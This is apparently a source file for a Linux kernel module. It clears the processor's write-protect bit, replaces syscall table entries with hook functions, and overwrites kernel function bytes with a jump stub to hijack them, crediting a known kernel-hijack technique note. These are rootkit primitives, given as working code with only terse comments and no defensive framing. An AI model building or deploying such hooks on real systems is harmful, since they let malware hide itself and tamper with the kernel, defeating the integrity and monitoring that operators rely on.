#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "common.h"

#define WRITE_PROTECT_MASK 0x10000

void **syscallTable = (void **) SYSCALL_TABLE;
void (*pages_rw)(struct page *page, int numpages) = (void *) PAGES_RW;
void (*pages_ro)(struct page *page, int numpages) = (void *) PAGES_RO;

unsigned long original_rw_mask;

// cr0 is a control register in the x86 family of processors.
// Bit 16 of that register is WP - Write protect: Determines whether
// the CPU can write to pages marked read-only
void enable_rw(void) {
	original_rw_mask = read_cr0() & WRITE_PROTECT_MASK;
	write_cr0 (read_cr0() & (~ WRITE_PROTECT_MASK));
}

void revert_rw(void) {
	write_cr0 (read_cr0() | original_rw_mask); //TODO: change this to restore the previous flags instead of assume what the flags will be
}

// Replace the syscall specified by syscallNumber with the function
// pointed to by hook.
// Returns the previous function installed at that syscallNumber
void *hookSyscall(unsigned int syscallNumber, void *hook) {
	void *previous;   // The previous syscall installed in the table

	enable_rw();
	previous = syscallTable[syscallNumber];
	syscallTable[syscallNumber] = hook;
	revert_rw();

	return previous;
}

/*
0. Write your replacement function
1. Figure out what to write and where the function is
2. Write it to the function, and remember the original bytes
3. When you call the original, write the original back first, then overwrite it


 */

// Method inspired by http://www.selfsecurity.org/technotes/silvio/kernel-hijack.txt
// Hijack the function pointed to by 'function' and replaces it with a jump to
// 'replacement'. Returns 
void getHijackBytes(void *hijackDestination, /* out */ char *bytes) {
	static char hijackBytesStub[NUM_HIJACK_BYTES] =
			"\xb8\x00\x00\x00\x00"  /* movl   $0,%eax */
			"\xff\xe0"              /* jmp    *%eax   */
			;
	strncpy(bytes, hijackBytesStub, NUM_HIJACK_BYTES);
	*(long *) &bytes[1] = (long) hijackDestination;
}

/*void writeHijackBytes(void *address, char *replacementBytes) {
   replaceBytes(address, replacementBytes, NULL) {
}*/

void writeHijackBytes(void *address, char *replacementBytes, /* out */ char *previousBytes) {
	int i;
	enable_rw();
	for (i = 0; i < NUM_HIJACK_BYTES; i++) {
		if (previousBytes) *previousBytes++ = *(char *)address;
		*(char *)address++ = *replacementBytes++;
	}
	revert_rw();
}

